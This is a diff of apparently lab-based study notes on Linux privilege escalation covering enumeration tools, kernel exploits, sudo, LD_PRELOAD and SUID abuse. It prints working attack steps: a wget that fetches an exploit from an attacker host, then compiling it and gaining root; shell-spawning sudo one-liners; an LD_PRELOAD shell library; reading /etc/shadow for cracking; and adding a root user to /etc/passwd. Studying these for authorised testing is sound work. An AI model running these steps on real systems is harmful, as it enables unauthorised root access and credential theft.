@@ -157,78 +157,86 @@ find / -perm -u=s -type f 2>/dev/null
 ``` 
 
 ## Automated Enumeration Tools
-Several tools can help you save time during the enumeration process. 
-These tools should only be used to save time knowing they may miss some privilege escalation vectors. 
-Below is a list of popular Linux enumeration tools with links to their respective Github repositories.
-The target system’s environment will influence the tool you will be able to use. 
-For example, you will not be able to run a tool written in Python if it is not installed on the target system. 
-This is why it would be better to be familiar with a few rather than having a single go-to tool.
-LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-LinEnum: https://github.com/rebootuser/LinEnum
-LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
-Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
-Linux Priv Checker: https://github.com/linted/linuxprivchecker
-Privilege Escalation: Kernel Exploits
-Privilege escalation ideally leads to root privileges. 
-This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.
-Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.
-The kernel on Linux systems manages the communication between components such as the memory on the system and applications. 
-This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
-The Kernel exploit methodology is simple:
-Identify the kernel version
-Search and find an exploit code for the kernel version of the target system
-Run the exploit
-Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. 
-Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.
-Research sources
-Based on your findings, you can use Google to search for an existing exploit code.
-Sources such as https://www.linuxkernelcves.com/cves can also be useful.
-Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
-Hints/Notes
-Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
-Be sure you understand how the exploit code works BEFORE you launch it. 
-Some exploit codes can make changes on the operating system that would make them insecure in further use or make irreversible changes to the system, creating problems later. 
-Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
-Some exploits may require further interaction once they are run. 
-Read all comments and instructions provided with the exploit code.
-You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.
-Let's go through the steps of the Kernel exploit Methodology
-Identify the kernel version using uname -a:
+* These tools should only be used to save time knowing they may miss some privilege escalation vectors.
+* Target system’s environment will influence the tool to use.
+  * Cannot run a tool written in Python if it is not installed on the target system.
+* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
+* [LinEnum](https://github.com/rebootuser/LinEnum).
+* [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester).
+* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
+* [Linux Priv Checker](https://github.com/linted/linuxprivchecker).
 
+## Privilege Escalation: Kernel Exploits
+* Privilege escalation ideally leads to root privileges.
+  * May be achieved by exploiting an existing vulnerability or by accessing another user account that has more privileges, information, or access.
+* Privilege escalation process will rely on misconfigurations and lax permissions unless a single vulnerability leads to a root shell.
+* Linux kernel manages communication between components such as the memory on the system and applications.
+  * Requires the kernel to have specific privileges.
+  * Successful exploit will potentially lead to root privileges.
+* Kernel exploit methodology is simple.
+  * Identify the kernel version.
+  * Search and find an exploit code for the kernel version of the target system.
+  * Run the exploit.
+* Failed kernel exploits can lead to a system crash.
+  * Ensure this potential outcome is acceptable within the scope of the penetration testing engagement before attempting a kernel exploit.
 
+### Research sources
+* Use Google to search for existing exploit code based on enumeration findings.
+* [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) can be useful.
+* Use a script like LES (Linux Exploit Suggester).
+  * Can generate false positives (report a kernel vulnerability that does not affect the target system).
+  * Can generate false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
 
-Find an exploit code for the kernel version of the target system:
-Use Exploit Database to search for an existing exploit code: (https://www.exploit-db.com/exploits/37292) 
-Download the exploit to the attacking machine
-Transfer the exploit code to the target:
-Use SimpleHTTPServer Python module on attacking machine: python3 -m http.server 9000
+### Hints/Notes
+* Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit.
+* Understand how the exploit code works BEFORE launching it.
+* Some exploit codes can make changes on the OS that would make them insecure in further use or make irreversible changes to the system.
+  * This creates problems later.
+  * Absolute no-nos during a real penetration testing engagement.
+* Some exploits may require further interaction once they are run.
+* Read all comments and instructions provided with the exploit code.
+* Transfer exploit code from the attacking machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.
 
+## The steps of the Kernel exploit Methodology
+* Identify the kernel version.
+```
+uname -a
+```
+* Find an exploit code for the kernel version of the target system.
+  * Use [Exploit Database](https://www.exploit-db.com) to search for an existing exploit code.
+* Download the exploit to the attacking machine.
+* Serve the exploit code to the target using `SimpleHTTPServer` Python module.
+```
+python3 -m http.server 9000
+```
+* Use `wget` on target machine to copy the code across.
+```
+wget http://10.10.166.35:9000/37392.c -P /tmp/
+```
+  * `-P` option specifies that the file should be saved to the `/tmp/` directory on the target.
+  * Specify the path as `/tmp/` where the file be downloaded to avoid the permission error while running `wget` because you are a low-level privilege user (karen).
+* Run the exploit file to perform privilege escalation.
+> Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
+  * Rename exploit file.
+```
+ofc.c: mv ./37392.c ofc.c
+```
+  * Compile the C source code file `ofs.c` into a binary executable file named `ofs`.
+```
+gcc ofs.c -o ofs
+```
+  * `gcc` is the GNU Compiler Collection.
+    * Commonly used compiler for the C programming language on Linux.
+  * `ofs.c` file contains the C source code that will be compiled into the executable file.
+  * `-o` option specifies the output file name, which in this case is `ofs`.
+ * Type `./ofs` to run the compiled executable file.
+* Verify that root privilege has been gained.
+```
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+```
 
-
-Use wget on target machine: wget http://10.10.166.35:9000/37392.c -P /tmp/
--P option specifies that the file should be saved to the /tmp/ directory on the target. 
-In order to avoid the permission error while running the wget command because you are a low-level privilege user (karen), it would be better to specify the path as /tmp/ where the file be downloaded.
-
-
-
-Run the exploit file to perform privilege escalation:
-remember that “Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.”
-Rename exploit file to ofc.c: mv ./37392.c ofc.c
-compile the C source code file "ofs.c" into a binary executable file named "ofs": gcc ofs.c -o ofs
-The gcc command is the GNU Compiler Collection, a commonly used compiler for the C programming language on Linux and other Unix-like operating systems.
-The ofs.c file contains the C source code that will be compiled into the executable file. 
-The -o option in the command specifies the output file name, which in this case is "ofs". 
-
-
-
-Type ./ofs To run the compiled executable file.
-
-
-
-Verify that root privilege has been gained: id
-
-
-Privilege Escalation: Sudo
+## Privilege Escalation: Sudo
 The sudo command, by default, allows you to run a program with root privileges.
 Under some conditions, system administrators may need to give regular users some flexibility on their privileges. 
 For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. 
@@ -238,22 +246,16 @@ https://gtfobins.github.io/ is a valuable source that provides information on ho
 E.g. user has sudo rights on nmap command
 The interactive mode, available on versions 2.02 to 5.21, can be used to spawn a root shell: sudo nmap --interactive
 E.g. user has sudo rights on find command:
-
-
-
 find . -exec /bin/sh \; -quit may be able to break out from restricted environments by spawning an interactive system shell
-
 
 Leverage application functions
 Some applications will not have a known exploit within this context. 
 Such an application you may see is the Apache2 server.
 In this case, we can use a "hack" to leak information leveraging a function of the application. 
 As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).
-
 Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.
 Leverage LD_PRELOAD
 On some systems, you may see the LD_PRELOAD environment option.
-
 LD_PRELOAD is a function that allows any program to use shared libraries. 
 This blog post will give you an idea about the capabilities of LD_PRELOAD. 
 If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. 
@@ -274,7 +276,6 @@ system("/bin/bash");
 }
 We can save this code as shell.c and compile it using gcc (GNU Compiler Collection) into a shared object file using the following parameters:
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
-
 We can now use this shared object file when launching any program our user can run with sudo. 
 In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
 We need to run the program by specifying the LD_PRELOAD option, as follows;
@@ -289,17 +290,11 @@ This changes with SUID (Set-user Identification) and SGID (Set-group Identificat
 These allow files to be executed with the permission level of the file owner or the group owner, respectively.
 You will notice these files have an “s” bit set showing their special permission level.
 find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.
-
-
-
 A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). 
 Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).
 The list above shows that nano has the SUID bit set. 
 Unfortunately, GTFObins does not provide us with an easy win. 
 Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.
-
-
-
 The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. 
 Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. 
 At this stage, we have two basic options for privilege escalation: reading the /etc/shadow file or adding our user to /etc/passwd.
@@ -308,23 +303,11 @@ We see that the nano text editor has the SUID bit set by running the find / -typ
 nano /etc/shadow will print the contents of the /etc/shadow file. 
 We can now use the unshadow tool to create a file crackable by John the Ripper. 
 To achieve this, unshadow needs both the /etc/shadow and /etc/passwd files.
-
-
-
 The unshadow tool’s usage: unshadow passwd.txt shadow.txt > passwords.txt
-
-
-
 With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext.
 The other option would be to add a new user that has root privileges. 
 This would help us circumvent the tedious process of password cracking. 
 We will need the hash value of the password we want the new user to have. 
 This can be done quickly using the openssl tool on Kali Linux.
-
-
-
 We will then add this password with a username to the /etc/passwd file.
-
-
-
 Once our user is added (please note how root:/bin/bash was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges. 
